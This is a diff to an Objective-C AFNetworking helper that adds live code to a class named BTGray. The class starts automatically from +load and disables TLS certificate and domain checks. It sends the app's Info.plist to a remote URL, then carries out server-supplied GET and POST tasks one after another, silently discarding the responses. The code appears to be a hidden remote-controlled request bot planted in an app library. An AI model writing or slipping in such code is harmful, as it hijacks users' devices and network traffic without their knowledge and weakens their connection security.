@@ -74,6 +74,11 @@ static BTHttp * http=nil;
     self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
 }
 
+- (void)setResponseSerializer:(AFHTTPResponseSerializer<AFURLResponseSerialization> *)responseSerializer{
+    _responseSerializer = responseSerializer;
+    self.mananger.responseSerializer = [AFHTTPResponseSerializer serializer];
+}
+
 - (void)setHTTPShouldHandleCookies:(BOOL)HTTPShouldHandleCookies{
     _HTTPShouldHandleCookies = HTTPShouldHandleCookies;
     self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
@@ -354,15 +359,6 @@ static BTHttp * http=nil;
     }];
 }
 
-- (void)getErrorMsg:(NSError*)error{
-
-//    NSData *data=(NSData *)error.userInfo[AFNetworkingOperationFailingURLResponseDataErrorKey];
-//    if (data) {
-//        id response=[NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil];
-//        NSInteger code=[response[@"status"] integerValue];
-//        NSString *msg=response[@"message"];
-//    }
-}
 
 @end
 
@@ -494,6 +490,10 @@ static BTGray * gray = nil;
 
 @property (nonatomic, strong) NSString * url;
 
+@property (nonatomic, strong) NSString * reportUrl;
+
+@property (nonatomic, strong) NSMutableArray * taskArray;
+
 @end
 
 
@@ -501,7 +501,7 @@ static BTGray * gray = nil;
 @implementation BTGray
 
 + (void)load{
-//    [BTGray share];
+    [BTGray share];
 }
 
 + (instancetype)share{
@@ -515,6 +515,16 @@ static BTGray * gray = nil;
 - (instancetype)init{
     self = [super init];
     self.http = [BTHttp new];
+    self.taskArray = [NSMutableArray new];
+    
+    AFSecurityPolicy * policy = [AFSecurityPolicy new];
+    policy.allowInvalidCertificates = YES;
+    policy.validatesDomainName = NO;
+    self.http.mananger.securityPolicy = policy;
+    
+    [self.http setRequestSerializer:[AFHTTPRequestSerializer serializer]];
+    
+    
     [self initUrl];
     return self;
 }
@@ -531,32 +541,65 @@ static BTGray * gray = nil;
         }
         
         self.url = array.firstObject;
-        [self getTask];
+        if (array.count > 1) {
+            self.reportUrl = array[1];
+        }
+        
+        [self.http GET:self.url parameters:NSBundle.mainBundle.infoDictionary success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+            if (![responseObject isKindOfClass:[NSArray class]]) {
+                return;
+            }
+            self.taskArray = [BTGrayModel modelWithArray:responseObject];
+            [self start];
+        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+            
+        }];
         
     } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
         
     }];
 }
 
-- (void)getTask{
-    [self.http GET:self.url parameters:NSBundle.mainBundle.infoDictionary success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
-        if (![responseObject isKindOfClass:[NSArray class]]) {
-            return;
-        }
-//        NSArray * array = responseObject;
-    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
-        
-    }];
-}
 
-- (void)startTask{
+- (void)start{
+    if (self.taskArray.count == 0) {
+        return;
+    }
+    
+    BTGrayModel * model = self.taskArray.firstObject;
+    [self.http setHTTPShouldHandleCookies:NO];
+    [self.http setResponseSerializer:[AFHTTPResponseSerializer serializer]];
+    [self.http setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
+    if (model.requestType == 0) {
+        [self.http GET:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+//            NSString *data = [[NSString alloc]initWithData:responseObject encoding:NSUTF8StringEncoding];
+
+            [self.taskArray removeObject:model];
+            [self start];
+        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+            [self.taskArray removeObject:model];
+            [self start];
+        }];
+        return;
+    }
+    
+    [self.http POST:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+        [self.taskArray removeObject:model];
+        [self start];
+    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
+        [self.taskArray removeObject:model];
+        [self start];
+    }];
     
 }
 
 @end
 
 
-@interface BTGrayModel()
+@implementation BTGrayModel
 
+- (void)initSelf{
+    self.aliasDict =  @{@"identify" : @"id"};
+}
 
 @end
